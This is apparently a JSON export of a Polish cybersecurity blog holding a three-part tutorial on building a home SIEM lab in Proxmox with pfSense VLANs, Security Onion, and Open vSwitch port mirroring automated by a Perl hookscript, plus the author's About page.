wyodrębnionych z ruchu sieciowego lub innych źródeł i generowanie szczegółowych metadanych do analizy Elastic Stack - Elasticsearch, Kibana, Logstash. Znana trójka do zbierania, analizowania, korelowania i zarządzania logami Stenographer - przechwytywanie i analiza pakietów, wydajniejszy niż Wireshark w sieciach o dużej przepustowości Elastic Agent - zastąpił Beatsy, agent endpointowy zbierający w czasie rzeczywistym logi systemowe, aplikacji, procesów. Cyberchef - narzędzie do m.in. kodowania/dekodowania, szyfrowania/deszyfrowania danych Narzędzia wykorzystywane w Security Onion są open-source.\nDeployment i wymagania #\rJak wspominałem wyżej, jedną z kluczowych cech SO jest szybkość deploymentu i zautomatyzowana instalacja, nieróżniąca się poziomem skomplikowania od innych popularnych dystrybucji Linuxa. Security Onion możemy postawić na 4 sposoby:\nImport - w tym trybie nie ma możliwości monitorowania ruchu sieciowego na żywo. Można jedynie importować zrzuty PCAP do analizy Evaluation - wersja demonstrująca możliwości narzędzia, nie jest przeznaczona do działania w produkcji Standalone - samodzielna instancja Security Onion, w pełni gotowa do pracy w środowisku produkcyjnym. Monitoruje i analizuje ruch sieciowy na żywo. Wymaga dużo zasobów. Distributed - rozproszona, pełna wersja, podzielona na nody. W pierwszej kolejności konfigurujemy node zarządzający, następnie dołączamy następne, pełniące różne funkcje. Oficjalne wymagania sprzętowe dla wersji Standalone:\n4 CPU cores 24 GB RAM Pamięć masowa min. 200 GB 2 karty sieciowe Jak na jedną maszynkę to dość sporo, dlatego w pierwszej części podkreślałem, że bardzo ważna jest modułowość mini-PC i możliwość zmiany komponentów. Obecnie mam 32 GB, ale spróbujemy przypisać tylko 20 GB RAM-u.\nInstalacja #\rPobieramy obraz z oficjalnej strony Security Onion i wrzucamy go do storage\u0026rsquo;u w Proxmox tak samo jak w przypadku poprzednich maszyn. Przy stawianiu maszyny należy pamiętać, że potrzebuje dwóch interfejsów sieciowych - do zarządzania oraz do monitorowania ruchu sieciowego. Wybieramy połączenie ze switchem vmbr10 (nasz \u0026ldquo;OVS Bridge\u0026rdquo;). W przypadku interfejsu monitorującego wyłączamy firewall. Natomiast w konfiguracji interfejsu zarządzającego zaznaczamy, że ramki mają mieć przypisany tag 3 (VLAN 3 SIEM). Pamiętamy o przypisaniu odpowiedniej ilości zasobów.\nUruchamiamy maszynę wirtualną i przechodzimy przez prostą konfigurację. Poniżej wstawiam kilka ważniejszych ustawień.\nWybieramy standardową instalację.\nWybieramy wersję Standalone\nW moim przypadku SIEM nie ma dostępu do Internetu. Wybieram opcję \u0026ldquo;Airgap\u0026rdquo;- w cyberbezpieczeństwie pojęcie to oznacza po prostu, że host jest fizycznie odizolowany od niezabezpieczonych sieci - w tym przypadku od Internetu. Jeśli będziemy chcieli w przyszłości zaktualizować SO wraz z regułami, wystarczy że wgramy nowy obraz ISO.\nWybieramy interfejs, który da nam dostęp do webowego panelu zarządzającego.\nPrzypisujemy adres IP w naszym VLAN-ie. Zdecydowałem się na 10.0.30.10/24\nPodajemy adres IP bramy domyślnej.\nDomenę DNS zostawiam domyślną.\nWpisujemy adres e-mail do logowania się do panelu webowego oraz do Kibany. Nie musi być prawdziwy.\nJako metodę dostępu do panelu webowego wybrałem adres IP.\nTeraz wskażemy sieć VLAN 1 (Management), żebyśmy mogli z niej uzyskać dostęp do panelu webowego. Z żadnego innego VLAN-a nie dostaniemy się do niego.\nPodsumowanie naszych wyborów.\nPo wpisaniu adresu IP hosta Security Onion w przeglądarkę na Red Hat (VLAN 1), ukazuje nam się panel logowania. Wpisujemy wcześniej podany e-mail i utoworzone hasło.\nSukces! Właśnie postawiliśmy świeżego Security Onion. Jak możecie zauważyć mamy naprawdę sporo logów, dashboardów i zakładek.\nPort mirroring #\rDo poprawnego działania SO została nam jeszcze tylko jedna ważna rzecz do skonfigurowania - port mirroring. Jest to funkcja przełączników (w naszym przypadku Open vSwitch), która pozwala na kopiowanie ruchu z jednego lub wielu interfejsów do interfejsu docelowego w celu analizy tego ruchu. Tym interfejsem docelowym jest interfejs monitorujący w Security Onion. W terminalu Proxmoxa skonfigurujemy go ręcznie, ponieważ ta funkcja nie jest domyślnie włączona gdy wskazujemy interfejs monitorujący podczas instalacji SO.\nW shellu Proxmoxa wpisujemy polecenie \u0026ldquo;ip a\u0026rdquo;, aby zobaczyć wszystkie interfejsy w Proxmox, również te wirtualne. Szukamy interfejsu tap103i1 (103 to ID maszyny wirtualnej SO, i1 to interfejs nr. 1, czyli monitorujący).\nWpisujemy teraz polecenie ustawiające ten interfejs jako odbiorca mirrorowanego ruchu.\n-- --id=@p get port tap103i1\nPobieramy obiekt portu tap103i1\nNadajemy mu alias @p, żeby łatwiej się do niego odwoływać.\n-- --id=@m create mirror name=siemspan select-all=true output-port=@p\nTworzymy nowy obiekt typu Mirror o nazwie siemspan.\nselect-all=true - mirror obejmuje cały ruch na switchu.\noutput-port=@p - cały ten sklonowany ruch zostanie wysłany do portu monitorującego tap103i1\n-- set bridge vmbr10 mirrors=@m\nDo bridge’a vmbr10 przypisujemy właśnie utworzony mirror @m.\nDzięki temu ruch z bridge’a zaczyna być kopiowany zgodnie z regułami, które podałeś w punkcie 2.\nJest tylko jedno ALE. Port mirroring nie jest trwały i po wyłączeniu hosta Proxmoxa lub samej maszyny Security Onion trzeba wpisać polecenie na nowo (po reboocie SO port mirroring nadal działa). Czemu tak się dzieje? Okazuje się, że konfiguracja port mirroringu wprowadzona poleceniem ovs-vsctl zapisywana jest w OVSDB (baza danych Open vSwitch) tylko wtedy, gdy obiekt (np. port lub bridge) faktycznie istnieje w danej chwili. Gdy host Proxmox zostanie zrestartowany, wszystkie dynamiczne interfejsy typu \u0026rsquo;tap\u0026rsquo; znikają i pojawiają się ponownie dopiero w momencie startu maszyn wirtualnych. Ponieważ mirroring w OVS jest powiązany nie z samą nazwą interfejsu (tap103i1), ale z jego UUID, po starcie hosta OVS „gubi” ten obiekt i mirror przestaje działać.\nNatomiast zwykły reboot Security Onion nie powoduje zmian - port mirroring nadal działa. Problem pojawia się dopiero wtedy, gdy OVS sam jest restartowany (np. wraz z całym hostem). Poniżej wylistowałem dane interfejsu monitorującego, do którego spływa ruch sieciowy. Widać na nim aktualne UUID. Po wpisaniu polecenia \u0026lsquo;reboot\u0026rsquo; w shellu Security Onion, UUID pozostaje bez zmian.\nSprawdźmy jednak co się stanie, gdy wymusimy wyłączenie maszyny poprzez przycisk \u0026lsquo;Shutdown\u0026rsquo; w panelu Proxmox.\nJak widać sama nazwa interfejsu pozostaje bez zmian, ale zmieniło się UUID. Jak napisałem wcześniej, OVS \u0026ldquo;skupia się\u0026rdquo; na UUID, nie nazwie. Stąd port mirroring nie działa, bo teoretycznie interfejs, na którym działał pierwotnie, nie istnieje.\nZa pomocą tcpdump sprawdźmy czy interfejs monitorujący otrzymuje kopię ruchu sieciowego. Wyślemy pinga z testowej maszyny RedHat (VLAN 1) do maszyny Xubuntu (VLAN 2).\nFaktycznie - nic się nie pojawiło. Wpiszmy ponownie na hoście Proxmoxa polecenie konfigurujące port mirroring i sprawdźmy, czy tym razem odbieramy skopiowany ruch sieciowy.\nHookscript #\rJak widać, tym razem wszystko działa poprawnie. No dobra, ale czy serio będziemy wpisywać to polecenie ręcznie? Na szczęście Proxmox ma możliwość tworzenia hookscriptów, czyli skryptów które są wykonywane w określonym momencie życia maszyny wirtulanej (tuż przed startem, zaraz po starcie, tuż przed zatrzymaniem, zaraz po zatrzymaniu). Nasze polecenie zostanie uruchomione w fazie zaraz po starcie, a zaraz po zatrzymaniu usuniemy zbędne mirrory związane z bridgem vmbr10. Proxmox wykonuje skrypt podczas każdej z faz z dwoma argumantami - ID maszyny oraz faza jej życia. Np. /var/lib/vz/snippets/so-mirror-hook.sh 201 pre-start\n# Tworzymy katalog w /var/lib/vz o nazwie snippets\rmkdir /var/lib/vz/snippets\r# Tworzymy hookscript w nowym katalogu. Możemy skorzystać z przykładowego # /usr/share/pve-docs/examples/guest-example-hookscript.pl\rnano /var/lib/vz/snippets/portmirror_hookscript.pl\r# Dodajemy uprawnienie pozwalające na wykonanie\rchmod +x /var/lib/vz/snippets/portmirror_hookscript.pl\r# Przypisujemy go do maszyny wirtualnej Security Onion\rqm set 103 --hookscript local:snippets/portmirror_hookscript.pl Skrypt:\n#!/usr/bin/perl\ruse strict;\ruse warnings;\rprint \u0026#34;GUEST HOOK: \u0026#34; . join(\u0026#39; \u0026#39;, @ARGV). \u0026#34;\\n\u0026#34;;\rmy $vmid = shift; my $phase = shift; if ($phase eq \u0026#39;pre-start\u0026#39;) {\rprint \u0026#34;$vmid is starting, doing preparations.\\n\u0026#34;;\r} elsif ($phase eq \u0026#39;post-start\u0026#39;) {\rprint \u0026#34;$vmid started successfully.\\n\u0026#34;;\rif ($vmid == 103) {\rprint \u0026#34;Configuring port mirror for Security Onion (VM $vmid)...\\n\u0026#34;;\rmy $cmd = \u0026#34;ovs-vsctl \u0026#34; .\r\u0026#34;-- --id=\\@p get Port tap${vmid}i1 \u0026#34; .\r\u0026#34;-- --id=\\@m create Mirror name=siemspan select-all=true output-port=\\@p \u0026#34; .\r\u0026#34;-- set Bridge vmbr10 mirrors=\\@m\u0026#34;;\rsystem($cmd) == 0\ror warn \u0026#34;Failed to execute ovs-vsctl command: $!\\n\u0026#34;;\r}\r} elsif ($phase eq \u0026#39;pre-stop\u0026#39;) {\rprint \u0026#34;$vmid will be stopped.\\n\u0026#34;;\r} elsif ($phase eq \u0026#39;post-stop\u0026#39;) {\rprint \u0026#34;$vmid stopped. Doing cleanup.\\n\u0026#34;;\rif ($vmid == 103) {\rprint \u0026#34;Removing port mirror for Security Onion (VM $vmid)...\\n\u0026#34;;\rsystem(\u0026#34;ovs-vsctl clear Bridge vmbr10 mirrors\u0026#34;) == 0\ror warn \u0026#34;Failed to remove mirror: $!\\n\u0026#34;;\r}\r} else {\rdie \u0026#34;got unknown phase \u0026#39;$phase\u0026#39;\\n\u0026#34;;\r} Wyłączymy i włączymy ponownie Security Onion i sprawdzimy za pomocą tcpdump, czy skopiowany ruch jest odbierany.\nJak widać działa - udało nam się zautomatyzować poprawnie działający port mirroring. Dzięki temu cały ruch sieciowy między VLAN-ami będzie mógł być analizowany.\nPosdumowanie #\rW tej trzyczęściowej serii stworzyliśmy szkielet infrastruktury naszego laboratorium SOC. Postawiliśmy i skonfigurowaliśmy Security Onion oraz zautomatyzowaliśmy funkcję port mirroringu. Hookscript dodatkowo usuwa mirrory po wyłączeniu maszyny. Mamy już solidne podstawy, aby zagłębić się w działania Security Onion i tworzyć własne symulowane ataki i na nie reagować. Ale o tym w przyszłych wpisach. Jeśli dotarłeś/aś do końca, to bardzo dziękuję za przeczytanie i mam nadzieję, że w jakiś sposób pomogłem Ci w poprawnej konfiguracji Security Onion.\n","date":"4 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/siem_homelab3/","section":"Wpisy","summary":"Instalacja i konfiguracja Security Onion. Port mirroring w Proxmox","title":"Budowanie SIEM w Proxmox - Część III","type":"posts"},{"content":"","date":"4 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/homelab/","section":"Tags","summary":"","title":"Homelab","type":"tags"},{"content":"","date":"4 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/proxmox/","section":"Tags","summary":"","title":"Proxmox","type":"tags"},{"content":"","date":"4 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/siem/","section":"Tags","summary":"","title":"SIEM","type":"tags"},{"content":"","date":"4 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/soc/","section":"Tags","summary":"","title":"SOC","type":"tags"},{"content":"\rSzybkie spojrzenie na Proxmox #\rSkoro mamy już naszego mini-PC i hypervisora Proxmox, przejdziemy do wstępnej konfiguracji. Nie będę pokazywał procesu instalacyjnego Proxmoxa, bo jest to naprawdę łatwe i powstało już na ten temat dużo tutoriali.\nPo udanej instalacji ukazuje nam się główny panel w Proxmox. Po lewej stronie możemy zobaczyć nasz \u0026ldquo;Datacenter\u0026rdquo;, czyli nasza cała infrastruktura, najwyższy poziom w hierarchii. Tam zarządzamy globalnymi ustawieniami. \u0026ldquo;pve\u0026rdquo; natomiast jest nodem, czyli pojedynczą instancją Proxmoxa w klastrze. Nam wystarczy tylko jeden, ale w przyszłości możemy dodawać kolejne mini-PC i łączyć je w logiczną całość. Są tam również wylistowane maszyny wirtualne oraz storage. Zachęcam do szczegółowego zapoznania się z samym Proxmoxem bo oferuje naprawdę sporo możliwości.\nTopologia #\rZanim przejdziemy do tworzenia i łączenia ze sobą maszyn wirtualnych, musimy przemyśleć i zaplanować jak w ogóle chcemy zorganizować nasz lab. Dobrym narzędziem do tworzenia schematów i szkiców jest draw.io. Darmowa aplikacja webowa, która umożliwia w łatwy sposób tworzyć takie topologie wraz z opisami i ikonami.\nTak prezentuje się wstępna topologia. Wyjaśnijmy wszystko po kolei:\nStworzę wyizolowane, dedykowane VLANY - każdy o innym przeznaczeniu. Np. w VLAN 5 znajdują się wyłącznie hosty Windows, a w VLAN 2 znajdują się maszynki Red Teamu, które będą przeprowadzały ataki na VLAN 4 bądź 5. Do zarządzania maszynkami użyjemy Red Hata będącego w VLANie \u0026ldquo;Management\u0026rdquo; Wykorzystam Open vSwitch - wirtualny switch dostępny natywnie w Proxmox. Głównym powodem dlaczego go wybrałem jest port mirroring, który jest kluczowy do monitorowania ruchu sieciowego dla SIEM. Linux Bridge niestety nie ma tej funkcji. Dzięki niej, ruch sieciowy może być kopiowany do portu monitorującego SIEM. pfSense jest odpowiedzialny za kontrolę i filtrację ruchu sieciowego dzięki regułom firewalla. Skonfiguruję w nim również VLANy. W VLAN 4 znajdują się maszyny wirtualne Linuxa z podatnymi web aplikacjami do symulowanych ataków. VLAN 3 czyli SIEM - to tutaj będziemy zarządzać i analizować logi, monitorować ruch sieciowy Skoro już mamy plan i wiemy co i gdzie ma się znajdować, przejdźmy do konfiguracji.\npfSense #\rpfSense jest systemem operacyjnym pełniącym jednocześnie funkcję routera oraz firewalla i bazuje na FreeBSD. Istnieje jeszcze inny OS - OpenSense, który jak nazwa sugeruje, też jest oprogramowaniem open-source. Ja jednak zdecydowałem się na ten pierwszy, bo mam z nim nieco większe doświadczenie, ale zachęcam do sprawdzenia obu.\nW pfSense utworzymy reguły firewalla i VLANy. Obraz jest do pobrania za darmo z ich strony: hxxps://www[.]pfsense[.]org/download/\nWgrywamy ISO do wybranego przez nas storage\u0026rsquo;u.\nPrzydatną rzeczą jest to, że gdy podpinamy nowy dysk do mini-PC, w Proxmoxie możemy określić co chcemy na nim przechowywać (np. tylko pamięć dyskowa dla VM, templatki kontenerów, obrazy iso, wszystko na raz)\nZgodnie ze schematem, będziemy potrzebowali stworzyć switch OVS, który będzie przekazywał tagowane ramki do pojedynczego interfejsu sieciowego pfSense. Następnie będą one routowane do odpowiednich VLANów. Czyli klasyczny Router-on-a-stick.\nPrzechodzimy do naszego node\u0026rsquo;a, do zakładki \u0026ldquo;Network\u0026rdquo;. Proxmox posiada domyślny linux bridge, który łączy maszyny wirtualne z fizycznym interfejsem eno1 mini-PC. Tworzymy nowy, OVS Bridge. Przypisujemy tylko nazwę \u0026ldquo;vmbr10\u0026rdquo; i klikamy \u0026ldquo;Create\u0026rdquo;.\nNa liście urządzeń sieciowych pojawia się nasz bridge.\nTeraz stworzymy wirtualnego pfSense. W górnym prawym rogu panelu głównego Proxmox klikamy w \u0026ldquo;Create VM\u0026rdquo; (niebieski przycisk). W pierwszej kolejności wskazujemy node, nadajemy ID i nazwę - najlepiej krótką i rozpoznawalną.\nWskazujemy wgrany obraz\nOpcje systemowe zostawiamy bez zmian. Jedynie zaznaczamy checkbox \u0026ldquo;QEMU Agent\u0026rdquo;. Co to jest QEMU Guest Agent? To oprogramowanie instalowane w systemie operacyjnym gościa, które umożliwia lepszą komunikację między hostem Proxmox a maszyną wirtualną.\nPrzykładowe funkcje:\nInformacje o systemie gościa: CPU, pamięć, dyski\nWymiana danych między hostem a VM (np. kopiowanie plików).\nObsługa funkcji „freeze/thaw” podczas robienia backupów\nAby jednak agent w pełni działał, należy pobrać odpowiedni pakiet na VM. Ja ostatecznie tego nie zrobiłem, ale daję znać że istnieje taka opcja.\nDamy sobie 16 GB wirtualnej pamięci. Wskazujemy również storage, który zostanie wykorzystany. Reszta bez zmian.\nPrzypisujemy do maszyny 2 rdzenie procesora. Jako typ wybieramy \u0026ldquo;host\u0026rdquo;, czyli bezpośrednie wykorzystanie mocy obliczeniowej procesora hosta.\nPrzypisujemy 2 GB pamięci - w zupełności wystarczy\nPrzypisujemy najpierw interfejs sieciowy podpięty do bridge\u0026rsquo;a vmbr0. Reszta bez zmian.\nPotwierdzamy wybór i dodajemy drugi interfejs sieciowy, tym razem połączony z bridgem OVS.\nWybieramy maszynę pfSense z listy i otwieramy konsolę webową (Przycisk \u0026ldquo;Console\u0026rdquo; w górnym prawym rogu). Rozpoczynamy przypisywanie interfejsów. W Proxmox interfejs net0 jest odpowiednikiem vtnet0 w pfSense, net1 to vtnet1 itd.\nPrzypisujemy interfejs WAN. vtnet0 jest podłączony do vmbr0, więc uzyska adres IP z DHCP mojego fizycznego routera (przypominam, że bridge vmbr0 łączy wirtualne maszyny z siecią fizyczną hosta). Symulować to będzie wyjście na Internet.\nPozostały interfejs przypisujemy jako LAN. To jest ten połączony ze switchem OVS.\nZ dostępnych opcji wybieramy \u0026ldquo;Set interface(s) IP address\u0026rdquo;. Przypisujemy interfejsowi LAN adres 10.0.10.1/24. Wyłączamy DHCP i nie przypisujemy adresu IPv6.\nPozostałą konfigurację routera wykonamy przez panel webowy. Utworzymy VLANy i przypiszemy wirtualnym interfejsom adresy IP. Do tego będziemy potrzebowali nową maszynę wirtulną. Ja postawiłem na RedHat Linux, ale jakakolwiek dystrybucja z środowiskiem graficznym i przeglądarką też spełni swoją rolę.\nPrzydzielamy zasoby takie jak dla pfSense, ale z wirtualnym dyskiem o pojemności 32 GB.\nPrzechodzimy przez proces instalacyjny i zmieniamy adres IP na odpowiadający podsieci VLAN 1 (Management).\nWchodzimy w przeglądarkę Firefox i wpisujemy adres bramy domyślnej 10.0.10.1. Naszym oczom powinien ukazać się panel do logowania. Podajemy domyślne dane logowania (username:admin password:pfsense). Przechodzimy przez początkową konfigurację, pozostawiając domyślne opcje. Jedynie zmieniamy hasło na nowe.\nPrzechodzimy do zakładki Interfaces, a następnie do VLANs\nPo utworzeniu VLANów w zakładce Interface Assignments pojawi się możliwość przypisania wirtualnych interfejsów. Poniżej przykładowy interfejs VLANu Management.\nUtworzone VLANy z przypisanymi interefejsami,\nInterfejs LAN nie powinien mieć przypisanego adresu IP, jeśli wszystkie sieci mają być obsługiwane wyłącznie przez VLAN-y. Jeśli od razu usuniemy adresu z LAN i nie mamy jeszcze skonfigurowanych VLAN-ów z adresem i dostępem, stracimy możliwość zalogowania się przez GUI do panelu pfSense.\nPowinniśmy zrobić to w następującej kolejności:\nNajpierw utworzyć VLAN, przypisać mu adres IP i reguły dostępu.\nZweryfikować, że możemy się zalogować przez ten VLAN.\nDopiero wtedy usunąć adres z interfejsu rodzica (parent interface)\nKiedy już mamy utworzone VLANy, możemy przejść do postawienia maszyny wirtualnej Security Onion. O tym w następnej i jednocześnie ostatniej części.\n","date":"3 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/siem_homelab2/","section":"Wpisy","summary":"Stworzenie topologii logicznej i konfiguracja VLAN-ów w pfSense","title":"Budowanie SIEM w Proxmox - Część II","type":"posts"},{"content":"Security Information and Event Management - system do centralnego gromadzenia, zarządzania, analizowania i korelacji logów oraz incydentów bezpieczeństwa. To dzięki niemu zespół SOC jest w stanie odpowiednio szybko i precyzyjnie zareagować na zagrożenia w infrastrukturze IT. A myśleliście, żeby postawić takie coś u siebie - korzystając jedynie z darmowych i open-sourcowych narzędzi? W tej mini serii pokażę jak w prosty sposób stworzyć własny wirtualny SIEM sandbox w Proxmox bazujący na Security Onion. Od zera.\nSprzęt #\rGdy pierwszy raz wybierałem hardware, nie miałem jeszcze konkretnego planu stworzenia wirtualnego labu do nauki cyber. Wiedziałem jednak, że będę mocno eksperymentował z szeroko pojętą wirtualizacją i konteneryzacją. Potrzebowałem coś co starczy na dłużej. Zależało mi głównie na:\nmodularności - możliwości dołożenia dodatkowego RAM-u, zmiany CPU niskiej cenie małym rozmiarze niskim poborze prądu Szybko zorientowałem się, że Raspberry nie jest tu dobrym rozwiązaniem. Wysoka cena oraz brak możliwości łatwej zmiany CPU czy RAM skutecznie mnie zniechęciły. Stąd moje oczy zwróciły się ku terminalom/mini-PC. Modularność, niższa cena i prostota wymiany komponentów to było coś, czego szukałem. Wybór konkretnego modelu nie należał jednak do prostych, ale z pomocą przyszedł mi świetny film kanału tata.geek, gdzie porównuje najpopularniejsze i tanie terminale do wirtualizacji/self-hostingu.\nOstatecznie zdecydowałem się na model HP EliteDesk 800 G3. Co na pokładzie?\nIntel Core i3-6100T 32 GB RAM-u DDR4 2666MHz (SODIMM). Początkowo miał tylko 8, więc dokupiłem. Dostępne są 2 sloty. Dysk SSD m.2 256 GB. Później dokupiłem kolejny - tym razem SSD 256 GB na SATA, co patrząc z dzisiejszej perspektywy było słabym wyborem i mogłem dać większą pojemność. Wymiana podzespołów jest tak łatwa jak budowanie z klocków Lego. Nawet osoba nie składająca wcześniej PC nie będzie miała problemu z podstawowymi naprawami i konserwacją.\nUdostępniam też film pokazujący więcej szczegółów terminala.\nNo dobra, ale co z ceną? Mi swojego (używanego) udało się kupić za 268 zł na Allegro. Także całkiem w porządku. Oczywiście są tańsze modele - warto jednak sprawdzić na ile możemy je rozbudować. Może się zdarzyć, że maksymalnie możemy mieć np. 16 GB RAM.\nHypervisor #\rKiedy już wybraliśmy mini-PC, musimy wybrać hypervisora, czyli menedżera odpowiedzialnego za zarządzanie maszynami wirtualnymi/kontenerami i przydzielanie im fizycznych zasobów. Wyróżniamy 2 typy:\nTyp I Typ II Typ I tzw. bare-metal charakteryzuje się tym, że działa bezpośrednio na sprzęcie fizycznym. Zapewnia zazwyczaj większą wydajność i bezpieczeństwo dzięki braku pośredniczącego systemu operacyjnego. Wymaga jednak dedykowanego serwera. Są używane w środowiskach enterprise, gdzie liczy się wyżej wspomniana wydajność. Przykładami są Proxmox (o którym więcej za moment), XEN, VMware vSphere ESXi\nTyp II jest tak naprawdę programem, który negocjuje przydzielanie zasobów z systemem operacyjnym, przez co jest mniej wydajny niż hypervisor typu I i jest mniej skalowalny. Jednak jest łatwiejszy w obsłudze i zarządzaniu. Popularnym rozwiązaniem jest VirtualBox.\nDla naszych domowych potrzeb Proxmox będzie moim zdaniem najlepszym rozwiązaniem:\njest darmowy regularnie aktualizowany open-source łatwy w instalacji przejrzysty UI ma wszystkie inne plusy hypervisora typu I W takim razie mając wybrany mini-PC oraz zarządcę maszyn wirtualnych nie pozostaje nic innego jak konfiguracja środowiska.\n","date":"2 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/siem_homelab/","section":"Wpisy","summary":"Początek konfiguracji. Wybór hardware\u0026rsquo;u i hypervisora","title":"Budowanie SIEM w Proxmox - Część I","type":"posts"},{"content":"","externalUrl":null,"permalink":"/CyberZgroza/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/CyberZgroza/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rCześć, nazywam się Krzysztof i studiuję cyberbezpieczeństwo na Politechnice Wrocławskiej. Blog, który teraz czytacie - \u0026ldquo;CyberZgroza\u0026rdquo; - to projekt, który stworzyłem jako pewna forma dokumentowania tego, czego ostatnio się dowiedziałem/nauczyłem z szeroko pojętego bezpieczeństwa IT i motywator do regularnej nauki. Uznałem, że fajnie będzie podzielić się tą wiedzą z innymi za darmochę i jednocześnie monitorować swój progres.\n(O zgrozo! Ale co ja tu mogę przeczytać?)\nNa CyberZgrozie znajdują się artykuły i ciekawostki o różnej tematyce z cyberbezpieczeństwa - zarówno od strony red i blue team. Możecie też tu znaleźć omówienia wybranych maszyn z Hack The Box. Ogólnie - to co mnie akurat zainteresowało ;)\nMiłego czytania!\n-Krzysztof\n","externalUrl":null,"permalink":"/CyberZgroza/about/","section":"","summary":"","title":"O blogu słów kilka...","type":"page"},{"content":"","externalUrl":null,"permalink":"/CyberZgroza/series/","section":"Series","summary":"","title":"Series","type":"series"}]